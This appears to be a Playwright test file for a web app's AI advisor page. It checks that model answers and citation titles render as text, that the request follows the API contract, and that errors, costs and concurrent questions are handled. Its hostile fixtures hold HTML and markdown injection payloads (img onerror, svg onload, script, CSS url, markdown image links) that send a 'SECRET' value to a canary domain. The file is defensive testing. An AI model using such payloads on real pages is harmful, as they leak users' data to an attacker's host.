"""The advisor page in a real browser (M1 PR 11): ask, and see the answer with its
sources and grounding counts, rendered as text.

`POST /api/ask` is PR 12's. Here the browser's request is answered by route
interception with the JSON the plan fixes ("The API contract"), so the page is tested
before its route exists. Everything in that JSON is untrusted: the answer is model
output, and a citation's title can come from an attacker's e-mail (threat model, path
1). A hostile answer and a hostile title carry an image, inline and reference-style
links, a script, an inline handler and a stylesheet, each aimed at the canary domain;
the page must show them as text, create no element from them, send nothing off its
origin and trip no CSP violation. Controls show the checks would see it: the same
answer parsed as HTML creates an image and a request with the CSP bypassed, and a
violation under it.
"""

from __future__ import annotations

import json
from collections.abc import Iterator

import pytest
from playwright.sync_api import Browser, BrowserContext, Page, Route
from test_smoke import LISTEN_FOR_VIOLATIONS, Recorder, origin

from app.config import branding

CANARY = branding.DOMAINS.canary
FAMILY = branding.DEMO_MANDATE.family
TRACE_ID = "4bf92f3577b34da6a3ce929d0e0e4736"
HEADER_TRACE_ID = "00f067aa0ba902b700f067aa0ba902b7"
QUESTION = f"What do I need to know before the call with {FAMILY}?"
# Every element the hostile text names. None of them may exist on the page.
# Playwright waits 30 s by default; a missing element should fail a test quickly.
TIMEOUT_MS = 5000
MARKUP = "img, a, svg, iframe, object, embed, style, script:not([src]), link:not([href])"

HOSTILE_ANSWER = (
    f"Summary for {FAMILY} [source: doc-kyc-0001].\n"
    f'<img src="https://{CANARY}/p.png?d=SECRET" onerror="window.pwned=1">\n'
    f"![chart](https://{CANARY}/c.png?d=SECRET)\n"
    f"See [the report][1] and [this page](https://{CANARY}/l?d=SECRET).\n"
    f'<a href="https://{CANARY}/a?d=SECRET">open</a> <svg onload="window.pwned=2"></svg>\n'
    "<script>window.pwned = 3</script>\n"
    f"<style>body {{ background: url(https://{CANARY}/s.png?d=SECRET) }}</style>\n"
    f"https://{CANARY}/bare?d=SECRET\n"
    "\n"
    f"[1]: https://{CANARY}/r?d=SECRET\n"
)
HOSTILE_TITLE = f'Re: statement <img src="https://{CANARY}/t.png?d=SECRET"> [x](https://{CANARY}/)'


def answer(**changes: object) -> dict[str, object]:
    """A 200 body as the plan's contract fixes it."""
    body: dict[str, object] = {
        "answer": f"{FAMILY}: two figures, one of them unmatched [source: doc-kyc-0001].",
        "citations": [
            {"record_id": "doc-kyc-0001", "title": "KYC profile", "kind": "document"},
            {"record_id": "product-fund", "title": "Fund sheet", "kind": "product_sheet"},
        ],
        "grounding": {"figures": 3, "unmatched": 1, "unknown_citations": 0},
        "proposals": [],
        "usage": {"input_tokens": 1234, "output_tokens": 567},
        "cost_usd": 0.0123,
        "stop": "end_turn",
        "trace_id": TRACE_ID,
    }
    return body | changes


class Api:
    """Answers POST /api/ask in the browser, and keeps what the page sent."""

    def __init__(self, context: BrowserContext, base: str) -> None:
        self.requests: list[dict[str, object]] = []
        self.status = 200
        self.body: object = answer()
        self.content_type = "application/json"
        context.route(base + "/api/ask", self._handle)

    def _handle(self, route: Route) -> None:
        request = route.request
        self.requests.append(
            {
                "method": request.method,
                "headers": request.all_headers(),
                "body": request.post_data,
            }
        )
        payload = self.body if isinstance(self.body, str) else json.dumps(self.body)
        route.fulfill(
            status=self.status,
            headers={"content-type": self.content_type, "x-trace-id": HEADER_TRACE_ID},
            body=payload,
        )


@pytest.fixture
def context(browser: Browser) -> Iterator[BrowserContext]:
    context = browser.new_context(service_workers="block")
    context.set_default_timeout(TIMEOUT_MS)
    context.add_init_script(LISTEN_FOR_VIOLATIONS)
    yield context
    context.close()


@pytest.fixture
def context_without_csp(browser: Browser) -> Iterator[BrowserContext]:
    context = browser.new_context(service_workers="block", bypass_csp=True)
    context.set_default_timeout(TIMEOUT_MS)
    context.add_init_script(LISTEN_FOR_VIOLATIONS)
    yield context
    context.close()


def ask(page: Page, question: str = QUESTION) -> None:
    page.fill("#question", question)
    page.click("#ask button[type=submit]")


def shown(page: Page) -> None:
    page.wait_for_selector("#result:not([hidden])", timeout=5000)


def text(page: Page, selector: str) -> str:
    return page.locator(selector).text_content() or ""


def test_hostile_answer_is_shown_as_text(context: BrowserContext, app_url: str) -> None:
    recorder = Recorder(context)
    api = Api(context, app_url)
    api.body = answer(
        answer=HOSTILE_ANSWER,
        citations=[{"record_id": "rt-mail-0001", "title": HOSTILE_TITLE, "kind": "document"}],
    )
    page = context.new_page()
    page.goto(app_url + "/")
    ask(page)
    shown(page)

    assert text(page, "#answer") == HOSTILE_ANSWER
    assert HOSTILE_TITLE in text(page, "#citations")
    assert page.locator(MARKUP).count() == 0, page.locator(MARKUP).evaluate_all(
        "els => els.map(e => e.outerHTML)"
    )
    assert page.evaluate("window.pwned") is None
    page.wait_for_timeout(500)  # a late image or style request would show up here
    assert page.evaluate("window.__violations") == []
    assert len(api.requests) == 1, api.requests  # non-vacuity: the page asked
    foreign = [url for url in recorder.requests if origin(url) != origin(app_url)]
    assert foreign == [], foreign
    assert not [url for url in recorder.requests if CANARY in url], recorder.requests
    assert recorder.websockets == [], recorder.websockets


def test_request_follows_the_contract(context: BrowserContext, app_url: str) -> None:
    api = Api(context, app_url)
    page = context.new_page()
    page.goto(app_url + "/")
    ask(page, f"  {QUESTION}\n")
    shown(page)
    [sent] = api.requests
    assert sent["method"] == "POST"
    assert json.loads(str(sent["body"])) == {"question": QUESTION}
    headers = sent["headers"]
    assert isinstance(headers, dict)
    assert headers.get("content-type") == "application/json", headers
    # The Origin check of every non-GET route (ADR 0009): fetch in cors mode sends the
    # real origin even under Referrer-Policy: no-referrer, where a form sends "null".
    assert headers.get("origin") == app_url, headers


def test_citations_show_their_titles(context: BrowserContext, app_url: str) -> None:
    Api(context, app_url)
    page = context.new_page()
    page.goto(app_url + "/")
    ask(page)
    shown(page)
    items = page.locator("#citations li")
    assert items.count() == 2
    first, second = items.nth(0).text_content() or "", items.nth(1).text_content() or ""
    assert "KYC profile" in first and "doc-kyc-0001" in first, first
    assert "Fund sheet" in second and "product sheet" in second, second


def test_grounding_counts_never_say_verified(context: BrowserContext, app_url: str) -> None:
    api = Api(context, app_url)
    api.body = answer(grounding={"figures": 3, "unmatched": 1, "unknown_citations": 2})
    page = context.new_page()
    page.goto(app_url + "/")
    ask(page)
    shown(page)
    assert text(page, "#figures") == "2 of 3 figures found in the sources."
    assert text(page, "#unknown") == "2 cited ids are not among the sources."
    assert "verif" not in (page.locator("body").text_content() or "").lower()


@pytest.mark.parametrize(
    ("grounding", "figures", "unknown"),
    [
        ({"figures": 0, "unmatched": 0, "unknown_citations": 0}, "The answer has no figures.", ""),
        (
            {"figures": 1, "unmatched": 0, "unknown_citations": 1},
            "1 of 1 figure found in the sources.",
            "1 cited id is not among the sources.",
        ),
    ],
)
def test_grounding_edge_counts(
    context: BrowserContext, app_url: str, grounding: dict, figures: str, unknown: str
) -> None:
    api = Api(context, app_url)
    api.body = answer(grounding=grounding)
    page = context.new_page()
    page.goto(app_url + "/")
    ask(page)
    shown(page)
    assert text(page, "#figures") == figures
    assert text(page, "#unknown") == unknown


def test_trace_id_cost_and_tokens(context: BrowserContext, app_url: str) -> None:
    Api(context, app_url)
    page = context.new_page()
    page.goto(app_url + "/")
    ask(page)
    shown(page)
    assert text(page, "#trace") == TRACE_ID
    assert text(page, "#cost") == "USD 0.0123"
    assert text(page, "#tokens") == "1234 in, 567 out"
    assert page.locator("#stop").is_hidden()


def test_cost_as_a_decimal_string(context: BrowserContext, app_url: str) -> None:
    # PR 12 may serialise the loop's Decimal as a JSON string.
    api = Api(context, app_url)
    api.body = answer(cost_usd="0.0123")
    page = context.new_page()
    page.goto(app_url + "/")
    ask(page)
    shown(page)
    assert text(page, "#cost") == "USD 0.0123"


@pytest.mark.parametrize(
    ("stop", "reason"),
    [
        ("refusal", "The model declined to answer."),
        ("budget", "Stopped early: the token budget for this question ran out."),
        ("max_turns", "Stopped early: the turn limit for this question was reached."),
    ],
)
def test_stop_reason_is_stated(
    context: BrowserContext, app_url: str, stop: str, reason: str
) -> None:
    api = Api(context, app_url)
    api.body = answer(stop=stop, answer="")
    page = context.new_page()
    page.goto(app_url + "/")
    ask(page)
    shown(page)
    assert text(page, "#stop") == reason
    assert page.locator("#stop").is_visible()


@pytest.mark.parametrize(
    ("status", "message"),
    [
        (401, "Not signed in."),
        (403, "The request was refused."),
        (422, "The question was not accepted: it needs 1 to 2000 characters."),
        (429, "Too many questions in a short time. Wait a moment, then ask again."),
        (503, "The service is unavailable: no model key or no database."),
        (500, "The request failed (HTTP 500)."),
    ],
)
def test_failures_are_stated(
    context: BrowserContext, app_url: str, status: int, message: str
) -> None:
    api = Api(context, app_url)
    api.status = status
    api.body = {"detail": f"<img src=https://{CANARY}/e.png>"}
    page = context.new_page()
    page.goto(app_url + "/")
    ask(page)
    page.wait_for_function("document.getElementById('status').textContent !== ''")
    assert text(page, "#status") == f"{message} Trace id: {HEADER_TRACE_ID}"
    assert page.locator("#result").is_hidden()
    assert page.locator(MARKUP).count() == 0
    assert page.evaluate("window.__violations") == []


@pytest.mark.parametrize(
    "body",
    [
        "not json",
        json.dumps(answer(answer=["a list"])),
        json.dumps(answer(citations=[{"record_id": "x", "title": 1, "kind": "document"}])),
        json.dumps(answer(grounding={"figures": 1, "unmatched": 2, "unknown_citations": 0})),
        json.dumps(answer(grounding={"figures": -1, "unmatched": 0, "unknown_citations": 0})),
        json.dumps(answer(stop="__proto__")),
        json.dumps(answer(trace_id="<b>x</b>")),
        json.dumps(answer(cost_usd="1e3")),
        json.dumps(answer(usage={"input_tokens": 1.5, "output_tokens": 0})),
    ],
)
def test_unexpected_response_renders_nothing(
    context: BrowserContext, app_url: str, body: str
) -> None:
    api = Api(context, app_url)
    api.body = body
    page = context.new_page()
    page.goto(app_url + "/")
    ask(page)
    page.wait_for_function("document.getElementById('status').textContent !== ''")
    assert text(page, "#status") == f"Unexpected response. Trace id: {HEADER_TRACE_ID}"
    assert page.locator("#result").is_hidden()
    assert text(page, "#answer") == ""


def test_blank_question_is_not_sent(context: BrowserContext, app_url: str) -> None:
    api = Api(context, app_url)
    page = context.new_page()
    page.goto(app_url + "/")
    ask(page, "   \n ")
    assert text(page, "#status") == "Ask a question first."
    assert api.requests == []


def test_a_new_question_clears_the_last_answer(context: BrowserContext, app_url: str) -> None:
    api = Api(context, app_url)
    page = context.new_page()
    page.goto(app_url + "/")
    ask(page)
    shown(page)
    api.status = 503
    api.body = {"detail": "unavailable"}
    ask(page)
    page.wait_for_function("document.getElementById('status').textContent !== ''")
    assert page.locator("#result").is_hidden()
    assert text(page, "#answer") == ""
    assert page.locator("#citations li").count() == 0


# --- controls -----------------------------------------------------------------------


def test_control_html_rendering_is_seen(context_without_csp: BrowserContext, app_url: str) -> None:
    # With the CSP bypassed, the hostile answer parsed as HTML creates an image, and the
    # browser requests the canary host (and fails: no name resolves).
    recorder = Recorder(context_without_csp)
    page = context_without_csp.new_page()
    page.goto(app_url + "/")
    with page.expect_event("requestfailed", timeout=5000):
        page.evaluate("(a) => { document.getElementById('answer').innerHTML = a; }", HOSTILE_ANSWER)
    assert page.locator(MARKUP).count() > 0
    assert [url for url in recorder.requests if CANARY in url], recorder.requests


def test_control_csp_reports_an_injected_image(context: BrowserContext, app_url: str) -> None:
    # Under the CSP the same image is blocked and reported: the violation check has teeth.
    page = context.new_page()
    page.goto(app_url + "/")
    page.evaluate("(a) => { document.getElementById('answer').innerHTML = a; }", HOSTILE_ANSWER)
    page.wait_for_function("window.__violations.includes('img-src')", timeout=5000)


# --- more than one question ---------------------------------------------------------


class Held:
    """Keeps every POST /api/ask unanswered until the test fulfils it."""

    def __init__(self, context: BrowserContext, base: str) -> None:
        self.routes: list[Route] = []
        # A lambda: Playwright cannot wrap a builtin method such as list.append.
        context.route(base + "/api/ask", lambda route: self.routes.append(route))

    def wait_for(self, page: Page, count: int) -> None:
        for _ in range(100):
            if len(self.routes) >= count:
                return
            page.wait_for_timeout(50)
        pytest.fail(f"{len(self.routes)} requests held, expected {count}")

    @staticmethod
    def fulfil(route: Route, body: dict[str, object]) -> None:
        route.fulfill(status=200, content_type="application/json", body=json.dumps(body))


def test_a_newer_question_wins(context: BrowserContext, app_url: str) -> None:
    # The second question is asked with Ctrl+Enter while the first is pending; the
    # first's late response is dropped.
    held = Held(context, app_url)
    page = context.new_page()
    page.goto(app_url + "/")
    ask(page, "first")
    held.wait_for(page, 1)
    page.fill("#question", "second")
    page.press("#question", "Control+Enter")
    held.wait_for(page, 2)
    first, second = held.routes
    assert json.loads(first.request.post_data or "") == {"question": "first"}
    assert json.loads(second.request.post_data or "") == {"question": "second"}
    held.fulfil(second, answer(answer="the second answer"))
    shown(page)
    held.fulfil(first, answer(answer="the first answer"))
    page.wait_for_timeout(300)
    assert text(page, "#answer") == "the second answer"
    assert page.locator("#ask button").is_enabled()


def test_a_blank_question_drops_the_pending_one(context: BrowserContext, app_url: str) -> None:
    held = Held(context, app_url)
    page = context.new_page()
    page.goto(app_url + "/")
    ask(page, "first")
    held.wait_for(page, 1)
    page.fill("#question", " ")
    page.press("#question", "Control+Enter")
    assert text(page, "#status") == "Ask a question first."
    held.fulfil(held.routes[0], answer(answer="the first answer"))
    page.wait_for_timeout(300)
    assert page.locator("#result").is_hidden()
    assert text(page, "#status") == "Ask a question first."
    assert page.locator("#ask button").is_enabled()
    assert len(held.routes) == 1


def test_an_overlong_question_is_not_sent(context: BrowserContext, app_url: str) -> None:
    # maxlength stops typing, not a value set by script; the page checks again.
    api = Api(context, app_url)
    page = context.new_page()
    page.goto(app_url + "/")
    page.evaluate("() => { document.getElementById('question').value = 'x'.repeat(2001); }")
    page.click("#ask button[type=submit]")
    assert text(page, "#status") == "The question is too long: at most 2000 characters."
    assert api.requests == []
